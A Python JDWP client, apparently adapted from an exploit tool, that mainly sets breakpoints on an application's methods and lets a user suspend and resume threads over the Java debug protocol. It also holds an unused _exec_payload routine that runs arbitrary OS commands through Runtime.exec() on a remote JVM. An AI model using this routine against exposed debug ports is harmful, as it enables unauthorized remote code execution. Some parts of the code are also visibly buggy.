#!/usr/bin/env python3

#Built-in imports
import datetime
import socket
import traceback
import sys
import time
import struct
import urllib.error
import argparse

t_delta=datetime.timedelta(hours=9)
JST=datetime.timezone(t_delta,'JST')

#JDWP protocol variables
HANDSHAKE=b"JDWP-Handshake"

#Command signatures
VERSION_SIG=(1,1)
CLASSESBYSIGNATURE_SIG=(1,2)
ALLCLASSES_SIG=(1,3)
ALLTHREADS_SIG=(1,4)
IDSIZES_SIG=(1,7)
CREATESTRING_SIG=(1,11)
SUSPENDVM_SIG=(1,8)
RESUMEVM_SIG=(1,9)
SIGNATURE_SIG=(2,1)
FIELDS_SIG=(2,4)
METHODS_SIG=(2,5)
GETVALUES_SIG=(2,6)
CLASSOBJECT_SIG=(2,11)
INVOKESTATICMETHOD_SIG=(3,3)
REFERENCETYPE_SIG=(9,1)
INVOKEMETHOD_SIG=(9,6)
STRINGVALUE_SIG=(10,1)
THREADNAME_SIG=(11,1)
THREADSUSPEND_SIG=(11,2)
THREADRESUME_SIG=(11,3)
THREADSTATUS_SIG=(11,4)
THREADFRAMES_SIG=(11,6)
EVENTSET_SIG=(15,1)
EVENTCLEAR_SIG=(15,2)
EVENTCLEARALL_SIG=(15,3)

#Other codes
MODKIND_COUNT=1
MODKIND_THREADONLY=2
MODKIND_CLASSMATCH=5
MODKIND_LOCATIONONLY=7
EVENT_BREAKPOINT=2
SUSPEND_NONE=0
SUSPEND_EVENTTHREAD=1
SUSPEND_ALL=2
NOT_IMPLEMENTED=99
VM_DEAD=112
INVOKE_SINGLE_THREADED=2
TAG_OBJECT=76
TAG_STRING=115
TYPE_CLASS=1


class JDWPClient:
    def __init__(self,host:str,port:int=8000):
        self._host=host
        self._port=port
        self._methods={}
        self._fields={}
        self._id=0x01

        self._socket=None

    def _setLocationOnlyBreakPoint(self,break_on_method:str,break_on_class:str) -> int:
        c=self._get_class_by_name(break_on_class)
        if c is None:
            print(f"[-]Could not access class '{break_on_class}'")
            print("[-]It is possible that this class is not used by application")
            print("[-]Test with another one with option `--break-on`")
            return None

        self._get_methods(c["refTypeId"])
        m=self._get_method_by_name(break_on_method)
        if m is None:
            print(f"[-]Could not access method '{break_on_method}'")
            return None

        loc=bytes([TYPE_CLASS])
        loc+=self._format(self.referenceTypeIDSize,c["refTypeId"])
        loc+=self._format(self.methodIDSize,m["methodId"])
        loc+=struct.pack(">II",0,0)
        data=[
            (MODKIND_LOCATIONONLY,loc),
        ]
        rId=self._set_event(EVENT_BREAKPOINT,*data)
        print(f"[+]Created break event id={rId:#x}")
        return rId
    
    def runOriginal(self) -> bool:#type:ignore
        #1. get Runtime class reference
        runtimeClass=self._get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print("[-]Cannot find class Runtime")
            return False
        print(f"[+]Found Runtime class:id={runtimeClass['refTypeId']:#x}")

        #2. get getRuntime() meth reference
        self._get_methods(runtimeClass["refTypeId"])
        getRuntimeMeth=self._get_method_by_name("getRuntime")
        if getRuntimeMeth is None:
            print("[-]Cannot find method Runtime.getRuntime()")
            return False
        print(f"[+]Found Runtime.getRuntime():id={getRuntimeMeth['methodId']:#x}")

        #3. setup breakpoint on frequently called method
        rIds={}
        breakpoints=[
        ]
        crIds={}
        checkpoints=[
            "com.mycompany.app.App.startInstance",
            "com.mycompany.app.App.stopInstance",
        ]

        for breakpoint in breakpoints:
            break_on_class,break_on_method=convert_to_jdwp_format(breakpoint)
            rId=None
            while rId is None:
                rId=self._setLocationOnlyBreakPoint(break_on_method,break_on_class)
                if rId is not None:
                    rIds[rId]=breakpoint
                    break
                self._get_loaded_classes()


        for checkpoint in checkpoints:
            break_on_class,break_on_method=convert_to_jdwp_format(checkpoint)
            rId=None
            while rId is None:
                rId=self._setLocationOnlyBreakPoint(break_on_method,break_on_class)
                if rId is not None:
                    crIds[rId]=checkpoint
                    break
                self._get_loaded_classes()
        #4. resume vm and wait for event
        self._resume_vm()

        suspendThreads={}
        buf=None
        while True:
            print(f"[+]|{datetime.datetime.now(JST).strftime('%Y/%m/%d %H:%M:%S.%f')}|Waiting for an events")
            if buf is None:
                buf=self._wait_for_event()
            while buf is not None:
                self._process_events(buf,rIds,crIds,suspendThreads)
                buf=self._wait_for_event(timeout=1.0)
            buf=self._resume_vm()
            if buf is not None:
                self._read_reply()
            print(f"[+]|{datetime.datetime.now(JST).strftime('%Y/%m/%d %H:%M:%S.%f')}|Resume VM")
            #if len(rIds)==0:
            #    break
        return True
    def _process_events(self,buf,rIds,crIds,suspendThreads):
        print(f"[+]|{datetime.datetime.now(JST).strftime('%Y/%m/%d %H:%M:%S.%f')}|Received any events,and suspend VM:")
        for rId in rIds:
            ret=self._parse_event_breakpoint(buf,event_id=rId)
            if ret is not None:
                rId,tId,loc=ret
                print(f"[+]|{' '*26}|Received matching event from thread {tId:d}[{tId:#x}]|breakpoint={rIds[rId]:s}")
                self._get_loaded_classes()
                frames=self._frames_thread(tId)
                for fi,frame in enumerate(frames):
                    _class=self._get_class_by_classId(frame["classId"])
                    _method=self._get_method_by_methodId(frame["classId"],frame["methodId"])
                if _class is not None and _method is not None:
                    print(f"[+]|{' '*26}|{fi:3d}:{_class['signature']:s} {_method['name']:s}")
                else:
                    print(f"[-]|{' '*26}|{fi:3d}")
                if len(suspendThreads)>0:
                    val=input(f"[ ]|{' '*26}|resume other bp='r':")
                    if val=="r":
                        for key in suspendThreads:
                            print(f"[+]|{' '*26}|Thread {key:d} is suspend")
                ttId=1
                while ttId>0:
                    targetThreadId=input(f"[ ]|{' '*26}|resume Thread :")
                    if targetThreadId=="":
                        break
                    ttId=int(targetThreadId)
                    self._resume_thread(ttId)
                    suspendThreads.pop(ttId)
                    val=input(f"[ ]|{' '*26}|suspend this bp='s'|clear this bp='c' :")
                    if val=="s":
                        self._suspend_thread(tId)
                        suspendThreads[tId]=1
                        print(f"[+]|{' '*26}|suspend Thread {tId:d}")
                    elif val=="c":
                        rIds.pop(rId)
                        self._clear_event(EVENT_BREAKPOINT,rId)
                        break
        for rId in crIds:
            ret=self._parse_event_breakpoint(buf,event_id=rId)
            if ret is not None:
                rId,tId,loc=ret
                print(f"[+]|{' '*26}|Received matching event from thread {tId:d}[{tId:#x}]|checkPoints={crIds[rId]:s}")
                self._get_loaded_classes()
                frames=self._frames_thread(tId)
                break

    #Dunders
    def __repr__(self):
        return f"JDWPClient(host='{self._host}',port={self._port})"

    def __str__(self):
        return f"JDWPClient connected to {self._host}:{self._port}"

    def __enter__(self):
        self._handshake(self._host,self._port)
        self._get_id_sizes()
        self._get_version()
        self._get_loaded_classes()
        return self

    def __exit__(self,exc_type,exc_value,traceback):
        if self._socket:
            self._socket.close()
            self._socket=None

    #Private methods
    def _create_packet(self,cmdsig,data=b""):
        flags=0x00
        cmdset,cmd=cmdsig
        pktlen=len(data)+11
        pkt=struct.pack(">IIBBB",pktlen,self._id,flags,cmdset,cmd)
        pkt+=data
        self._id+=2
        return pkt

    def _read_reply(self,isPrint:bool=False,timeout:float=None,isReturnHeader:bool=False) -> bytes:
        #Receive the header from the socket
        if timeout is not None:
            self._socket.settimeout(timeout)
        try:
            header=self._socket.recv(11)
        except socket.timeout as e:
            return None
        finally:
            if timeout is not None:
                self._socket.settimeout(None)
        if isPrint:
            print(''.join('\\x{:02x}'.format(letter) for letter in header))
        if len(header)<11:
            raise Exception("Incomplete reply header")
        #Unpack the header
        pktlen,id,flags,errcode=struct.unpack(">IIcH",header)
        if isPrint:
            print(pktlen)

        #Check for reply packet type and error code
        if flags==b"\x80":#b'\x80' is the flag for a reply packet
            if errcode!=0:
                raise Exception(f"Received error code {errcode}")

        #Initialize an empty bytes object for the buffer
        buf=b""
        while len(buf) + 11<pktlen:
            recvSize=1024 if pktlen-(len(buf)+11)>1024 else pktlen-(len(buf)+11)
            data=self._socket.recv(recvSize)
            if data:
                buf+=data[:recvSize]
                if isPrint:
                    print(recvSize)
                    print(''.join('\\x{:02x}'.format(letter) for letter in data))
            else:
                #If no data is received,we wait a bit before trying again
                time.sleep(1)

        if isPrint:
            print(''.join('\\x{:02x}'.format(letter) for letter in buf))
        #Return the buffer of bytes
        if isReturnHeader:
            return (pktlen,id,flags,errcode),buf
        return buf

    def _parse_entries(self,buf:bytes,formats:list,explicit:bool=True) -> list:
        entries = []
        index = 0

        if explicit:
            (nb_entries,) = struct.unpack(">I", buf[:4])
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    (data[name],) = struct.unpack(">Q", buf[index : index + 8])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    (data[name],) = struct.unpack(">I", buf[index : index + 4])
                    index += 4
                elif fmt == "S":
                    (str_len,) = struct.unpack(">I", buf[index : index + 4])
                    data[name] = buf[index + 4 : index + 4 + str_len].decode("utf-8")
                    index += 4 + str_len
                elif fmt == "C":
                    (data[name],) = struct.unpack(">c", buf[index : index + 1])
                    index += 1
                elif fmt == "Z":
                    # Assuming this is a custom format and `_solve_string` is a method defined elsewhere.
                    (t,) = struct.unpack(">c", buf[index : index + 1])
                    index += 1
                    if t == b"s":
                        data[name] = self._solve_string(buf[index : index + 8])
                        index += 8
                    elif t == b"I":
                        (data[name],) = struct.unpack(">I", buf[index : index + 4])
                        index += 4
                else:
                    print(f"[x] Error: Unknown format {fmt}")
                    sys.exit(1)
            entries.append(data)

        return entries

    def _format(self,fmt,value):
        if fmt=="L" or fmt==8:
            return struct.pack(">Q",value)

        if fmt=="I" or fmt==4:
            return struct.pack(">I",value)

        raise Exception("Unknown format")

    def _unformat(self,fmt,value):
        try:
            if fmt in ("L",8):
                #Unpack a 64-bit unsigned integer from the beginning of the byte sequence.
                return struct.unpack(">Q",value[:8])[0]
            elif fmt in ("I",4):
                #Unpack a 32-bit unsigned integer from the beginning of the byte sequence.
                return struct.unpack(">I",value[:4])[0]
            else:
                #Raise an exception if the format is not recognized.
                raise Exception(f"Unknown format:{fmt}")
        except struct.error as e:
            #Raise a more specific error if the bytes object is too short.
            raise ValueError(f"Insufficient bytes for format '{fmt}':{e}")

    def _handshake(self,host:str,port:int):
        print(f"[+] Target: {host}:{port}")
        # Create a new socket using the default family and socket type.
        current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print("[*] Trying to connect...")
            current_socket.connect((host, port))
        except socket.error as msg:
            raise Exception(f"Failed to connect: {msg}")
        else:
            print("[+] Connection successful!")

        # Send the predefined handshake message to the server.
        current_socket.send(HANDSHAKE)
        print("[+] Handshake sent")

        # Wait for the server to send back the handshake message.
        received_handshake = current_socket.recv(len(HANDSHAKE))
        print("[+] Handshake sent")

        # Check if the received message matches the handshake message.
        if received_handshake != HANDSHAKE:
            # If it doesn't match, close the socket and raise an exception.
            current_socket.close()
            raise Exception("Failed to handshake with the server.")

        # If the handshake is successful, store the socket for future communication.
        self._socket = current_socket
        print("[+] Handshake successful")

    def _get_version(self):
        # Send a packet with the version signature to the server.
        print("[*] Requesting version information from the JDWP server...")
        self._socket.sendall(self._create_packet(VERSION_SIG))

        try:
            # Read the reply from the server.
            buf = self._read_reply()
        except Exception as error:
            # If there's an error reading the reply, print an error message and re-raise the exception.
            print(f"[!] Error reading version information: {error}")
            raise

        # Define the format for parsing the version information.
        formats = [
            ("S", "description"),
            ("I", "jdwpMajor"),
            ("I", "jdwpMinor"),
            ("S", "vmVersion"),
            ("S", "vmName"),
        ]

        # Parse the entries and set the attributes on the client instance.
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)
                print(f"\t• {name}: {value}")

        print("[+] Version information has been successfully received and set.")


    def _get_id_sizes(self):
        # Send a packet with the ID sizes signature to the server.
        print("[*] Requesting ID sizes from the JDWP server...")
        self._socket.sendall(self._create_packet(IDSIZES_SIG))

        try:
            # Read the reply from the server.
            buf = self._read_reply(isPrint=True)
        except Exception as error:
            # If there's an error reading the reply, print an error message and re-raise the exception.
            print(f"[!] Error reading ID sizes: {error}")
            raise

        # Define the format for parsing the ID sizes.
        formats = [
            ("I", "fieldIDSize"),
            ("I", "methodIDSize"),
            ("I", "objectIDSize"),
            ("I", "referenceTypeIDSize"),
            ("I", "frameIDSize"),
        ]
        # Parse the entries and set the attributes on the client instance.
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)
                print(f"\t• {name}: {value}")

        print("[+] ID sizes have been successfully received and set.")

    def _all_threads(self) -> list:
        if hasattr(self, "threads"):
            return self.threads

        self._socket.sendall(self._create_packet(ALLTHREADS_SIG))
        buf = self._read_reply()
        formats = [(self.objectIDSize, "threadId")]
        self.threads = self._parse_entries(buf, formats)
        return self.threads

    def _get_thread_by_name(self,name:str):
        self._all_threads()
        for t in self.threads:
            threadId = self._format(self.objectIDSize, t["threadId"])
            self._socket.sendall(self._create_packet(THREADNAME_SIG, data=threadId))
            buf = self._read_reply()
            if len(buf) and name == self._read_string(buf):
                return t
        return None

    def _get_loaded_classes(self,forceExecute:bool =True):
        # Check if the classes have already been retrieved and cached.
        if not hasattr(self, "classes"):
            # Send the command to get all classes.
            self._socket.sendall(self._create_packet(ALLCLASSES_SIG))
            # Read the reply from the server.
            buf = self._read_reply()
            # Define the format for each class entry.
            formats = [
                ("C", "refTypeTag"),
                (self.referenceTypeIDSize, "refTypeId"),
                ("S", "signature"),
                ("I", "status"),
            ]
            # Parse the entries and cache the results.
            self.classes = self._parse_entries(buf, formats)

        # Return the cached list of classes.
        return self.classes

    def _get_class_by_name(self,name:str):
        for entry in self.classes:
            if entry["signature"].lower()==name.lower():
                return entry
        return None

    def _get_class_by_classId(self,classId:any):
        for entry in self.classes:
            if entry["refTypeId"]== classId:
                return entry
        return None

    def _get_methods(self,refTypeId:int):
        if refTypeId not in self._methods:
            refId=self._format(self.referenceTypeIDSize,refTypeId)
            self._socket.sendall(self._create_packet(METHODS_SIG,data=refId))
            buf=self._read_reply()
            formats=[
                (self.methodIDSize,"methodId"),
                ("S","name"),
                ("S","signature"),
                ("I","modBits"),
            ]
            self._methods[refTypeId]=self._parse_entries(buf,formats)
        return self._methods[refTypeId]

    def _get_method_by_name(self,name:str):
        for refId in list(self._methods.keys()):
            for entry in self._methods[refId]:
                if entry["name"].lower()==name.lower():
                    return entry
        return None

    def _get_method_by_methodId(self,classId:any,methodId:any):
        if classId not in self._methods:
            self._get_methods(classId)
            if classId in self._methods:
                for entry in self._methods[classId]:
                    if entry["methodId"]==methodId:
                        return entry
        return None

    def _get_fields(self,refTypeId):
        if refTypeId not in self._fields:
            refId=self._format(self.referenceTypeIDSize,refTypeId)
            self._socket.sendall(self._create_packet(FIELDS_SIG,data=refId))
            buf=self._read_reply()
            formats=[
                (self.fieldIDSize,"fieldId"),
                ("S","name"),
                ("S","signature"),
                ("I","modbits"),
            ]
            self._fields[refTypeId]=self._parse_entries(buf,formats)
        return self._fields[refTypeId]

    def _get_value(self,refTypeId,fieldId):
        data=self._format(self.referenceTypeIDSize,refTypeId)
        data+=struct.pack(">I",1)
        data+=self._format(self.fieldIDSize,fieldId)
        self._socket.sendall(self._create_packet(GETVALUES_SIG,data=data))
        buf=self._read_reply()
        formats=[("Z","value")]
        field=self._parse_entries(buf,formats)[0]
        return field

    def _create_string(self,data:bytes):
        buf=self._build_string(data)
        self._socket.sendall(self._create_packet(CREATESTRING_SIG,data=buf))
        buf=self._read_reply()
        return self._parse_entries(buf,[(self.objectIDSize,"objId")],False)

    def _build_string(self,data:bytes):
        return struct.pack(">I",len(data)) + data

    def _read_string(self,data):
        size=struct.unpack(">I",data[:4])[0]
        return data[4 :4 + size]

    def _suspend_vm(self):
        self._socket.sendall(self._create_packet(SUSPENDVM_SIG))
        print("[+]Suspend VM signal sent")
        self._read_reply()

    def _resume_vm(self) -> None:
        self._socket.sendall(self._create_packet(RESUMEVM_SIG))
        #print("[+]Resume VM signal sent")
        header,buf=self._read_reply(isReturnHeader=True)
        pktlen,id,flags,errcode=header
        if flags!=b"\x80":
            return buf
        return None

    def _invoke_static(self,classId,threadId,methId,*args):
        data=self._format(self.referenceTypeIDSize,classId)
        data+=self._format(self.objectIDSize,threadId)
        data+=self._format(self.methodIDSize,methId)
        data+=struct.pack(">I",len(args))
        for arg in args:
            data+=arg
        data+=struct.pack(">I",0)

        self._socket.sendall(self._create_packet(INVOKESTATICMETHOD_SIG,data=data))
        buf=self._read_reply()
        return buf

    def _invoke(self,objId,threadId,classId,methId,*args):
        data=self._format(self.objectIDSize,objId)
        data+=self._format(self.objectIDSize,threadId)
        data+=self._format(self.referenceTypeIDSize,classId)
        data+=self._format(self.methodIDSize,methId)
        data+=struct.pack(">I",len(args))
        for arg in args:
            data+=arg
        data+=struct.pack(">I",0)

        self._socket.sendall(self._create_packet(INVOKEMETHOD_SIG,data=data))
        buf=self._read_reply()
        return buf

    def _solve_string(self,objId):
        self._socket.sendall(self._create_packet(STRINGVALUE_SIG,data=objId))
        buf=self._read_reply()
        if len(buf):
            return self._read_string(buf)

        return ""

    def _query_thread(self,threadId,kind):
        data=self._format(self.objectIDSize,threadId)
        self._socket.sendall(self._create_packet(kind,data=data))
        self._read_reply()
        return

    def _suspend_thread(self,threadId):
        return self._query_thread(threadId,THREADSUSPEND_SIG)

    def _status_thread(self,threadId):
        return self._query_thread(threadId,THREADSTATUS_SIG)

    def _resume_thread(self,threadId):
        return self._query_thread(threadId,THREADRESUME_SIG)

    def _frames_thread(self,threadId):
        data=self._format(self.objectIDSize,threadId)
        data+= self._format("I",0)
        data+= b'\xff\xff\xff\xff'
        self._socket.sendall(self._create_packet(THREADFRAMES_SIG,data=data))
        buf=self._read_reply()
        frameCount=struct.unpack(">I",buf[:4])[0]
        formats=[
            (self.frameIDSize,"frameId"),
            ("C","typeTag"),
            (self.referenceTypeIDSize,"classId"),
            (self.methodIDSize,"methodId"),
            (8,"index")
        ]
        frames=self._parse_entries(buf,formats,explicit=True)
        return frames

    def _set_event(self,event_code,*args) -> int:
        data=b''
        data+=bytes([event_code,SUSPEND_ALL])
        data+=struct.pack(">I",len(args))

        for kind,option in args:
            data+=bytes([kind]) + option

        self._socket.sendall(self._create_packet(EVENTSET_SIG,data=data))
        buf=self._read_reply()
        return struct.unpack(">I",buf)[0]

    def _clear_event(self,event_code,request_id):
        data=bytes([event_code]) + struct.pack(">I",request_id)
        self._socket.sendall(self._create_packet(EVENTCLEAR_SIG,data=data))
        self._read_reply()

    def _clear_events(self):
        self._socket.sendall(self._create_packet(EVENTCLEARALL_SIG))
        self._read_reply()

    def _wait_for_event(self,timeout:float=None):
        buf=self._read_reply(timeout=timeout)
        return buf

    def _parse_event_breakpoint(self,buf,event_id):
        received_id=struct.unpack(">I",buf[6:10])[0]
        if received_id!=event_id:
            return None
        thread_id=self._unformat(self.objectIDSize,buf[10 :10 + self.objectIDSize])
        location=-1#not used in this context
        return received_id,thread_id,location

    def _exec_info(self,threadId:int):
        #
        #This function calls java.lang.System.getProperties() and
        #displays OS properties (non-intrusive)
        #
        properties={
            "java.version":"Java Runtime Environment version",
            "java.vendor":"Java Runtime Environment vendor",
            "java.vendor.url":"Java vendor URL",
            "java.home":"Java installation directory",
            "java.vm.specification.version":"Java Virtual Machine specification version",
            "java.vm.specification.vendor":"Java Virtual Machine specification vendor",
            "java.vm.specification.name":"Java Virtual Machine specification name",
            "java.vm.version":"Java Virtual Machine implementation version",
            "java.vm.vendor":"Java Virtual Machine implementation vendor",
            "java.vm.name":"Java Virtual Machine implementation name",
            "java.specification.version":"Java Runtime Environment specification version",
            "java.specification.vendor":"Java Runtime Environment specification vendor",
            "java.specification.name":"Java Runtime Environment specification name",
            "java.class.version":"Java class format version number",
            "java.class.path":"Java class path",
            "java.library.path":"List of paths to search when loading libraries",
            "java.io.tmpdir":"Default temp file path",
            "java.compiler":"Name of JIT compiler to use",
            "java.ext.dirs":"Path of extension directory or directories",
            "os.name":"Operating system name",
            "os.arch":"Operating system architecture",
            "os.version":"Operating system version",
            "file.separator":"File separator",
            "path.separator":"Path separator",
            "user.name":"User's account name",
            "user.home":"User's home directory",
            "user.dir":"User's current working directory",
        }

        systemClass=self._get_class_by_name("Ljava/lang/System;")
        if systemClass is None:
            print("[-]Cannot find class java.lang.System")
            return False

        self._get_methods(systemClass["refTypeId"])
        getPropertyMeth=self._get_method_by_name("getProperty")
        if getPropertyMeth is None:
            print("[-]Cannot find method System.getProperty()")
            return False

        for propStr,propDesc in properties.items():
            propObjIds=self._create_string(propStr)
            if len(propObjIds)==0:
                print("[-]Failed to allocate command")
                return False
            propObjId=propObjIds[0]["objId"]

            data=[
                chr(TAG_OBJECT) + self._format(self.objectIDSize,propObjId),
            ]
            buf=self._invoke_static(
                systemClass["refTypeId"],threadId,getPropertyMeth["methodId"],*data
            )
            if buf[0]!=chr(TAG_STRING):
                print(("[-]%s:Unexpected returned type:expecting String" % propStr))
            else:
                retId=self._unformat(
                    self.objectIDSize,buf[1 :1 + self.objectIDSize]
                )
                res=self._solve_string(self._format(self.objectIDSize,retId))
                print(f"[+]Found {propDesc} '{res}'")

        return True

    def _exec_payload(
    self,
    thread_id:int,
    runtime_class_id:int,
    get_runtime_meth_id:int,
    command:str,
    ) -> bool:
        print(f"[+]Payload to send:'{command}'")

        command=command.encode(encoding="utf-8")

        #Allocate string containing our command to exec()
        cmd_obj_ids=self._create_string(command)
        if not cmd_obj_ids:
            raise Exception("Failed to allocate command string on target JVM")
        cmd_obj_id=cmd_obj_ids[0]["objId"]
        print(f"[+]Command string objectcreated id:{cmd_obj_id:x}")

        #Use context to get Runtime object
        buf=self._invoke_static(runtime_class_id,thread_id,get_runtime_meth_id)
        if buf[0]!=TAG_OBJECT:
            raise Exception(
                "Unexpected return type from _invoke_static:expected Object"
            )
        rt=self._unformat(self.objectIDSize,buf[1 :1 + self.objectIDSize])

        if rt is None:
            raise Exception("Failed to _invoke Runtime.getRuntime() method")

        print(f"[+]Runtime.getRuntime() returned context id:{rt:#x}")

        #Find exec() method
        exec_meth=self._get_method_by_name("exec")
        if exec_meth is None:
            raise Exception("Runtime.exec() method not found")
        print(f"[+]Found Runtime.exec():id={exec_meth['methodId']:x}")

        #Call exec() in this context with the allocated string
        data=[
            struct.pack(">B",TAG_OBJECT) + self._format(self.objectIDSize,cmd_obj_id)
        ]
        buf=self._invoke(
            rt,thread_id,runtime_class_id,exec_meth["methodId"],*data
        )
        if buf[0]!=TAG_OBJECT:
            raise Exception(
                "Unexpected return type from Runtime.exec():expected Object"
            )

        ret_id=self._unformat(self.objectIDSize,buf[1 :1 + self.objectIDSize])
        print(f"[+]Runtime.exec() successful,retId={ret_id:x}")
        return True

    #Properties
    @property
    def version(self) -> str:
        return f"{self.vmName}-{self.vmVersion}"


def convert_to_jdwp_format(input_string:str) -> tuple:
    i=input_string.rfind(".")
    if i==-1:
        raise ValueError("Invalid input format. Cannot parse path.")

    method=input_string[i + 1 :]
    class_name="L" + input_string[:i].replace(".","/") + ";"
    return class_name,method

